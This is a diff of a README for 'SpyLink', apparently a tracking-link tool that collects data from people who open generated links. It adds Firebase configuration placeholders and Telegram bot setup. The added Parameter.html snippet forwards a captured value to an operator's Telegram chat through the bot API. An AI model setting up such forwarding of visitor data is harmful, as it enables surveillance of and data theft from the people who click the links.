@@ -16,36 +16,52 @@ SpyLink is a demo tool that generates unique links which, upon user consent, req
 ## 🚀 Quick Installation & Run
 ```bash
 #Install dependencies
-pkg install github -y
+pkg install git -y
 pkg install nodejs -y
-pkg install unzip -y
 # Clone repository
 git clone https://github.com/JavaKyoseva/SpyLink
-#Unzip zip file
-cd SpyLink
-unzip main
 ```
 ## 🔥 Firebase Setup
 
 1. Go to [Firebase Console](https://console.firebase.google.com) and create a new project (e.g., "SpyLink").  
 2. Add a web app to your project and copy the generated `firebaseConfig`.  
-3. HTML/JS, include Firebase SDK:
+3. HTML/JS, configuration Firebase SDK:
 
+```js
+        const firebaseConfig = {
+  apiKey: "Your-Firebase-Api-Key",
+  authDomain: "Your-Firebase-Auth-Domain",
+  databaseURL: "Your-Firebase-Database-Url",
+  projectId: "Your-Project-Id",
+  storageBucket: "Your-Firebase-Storage-Bucket",
+  messagingSenderId: "Your-Firebase-Id",
+  appId: "Your-Firebase-App-Id",
+  measurementId: "Your-Measurement-Id"
+};
+```
+
+4. Secure your database via Firebase Rules to allow only authorized writes and reads.
+
+5. Parameter.html file configuration
+  
+5.1 Open Telegram and search for @BotFather
+
+5.2 Get a new bot token
+
+5.3 Write @chat_id and search
+
+5.4 Get a your chat id
+
+5.5 Edit the Parameter.html file
 ```html
-<script src="https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js"></script>
-```
-4. Initialize Firebase in your JS:
-
-```javascript
-const app = firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
+  const encodedKey = encodeURIComponent(key);
+  const botToken = 'Your-Bot-Token';
+  const chatId = 'Your-Chat-Id';
+  const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedKey}`;
 ```
 
-5. Secure your database via Firebase Rules to allow only authorized writes and reads.
-
+6. Start localhost
 ```bash
-# start localhost
 cd spylink
 npx http-server . -p 3000
 # Open http://localhost:3000
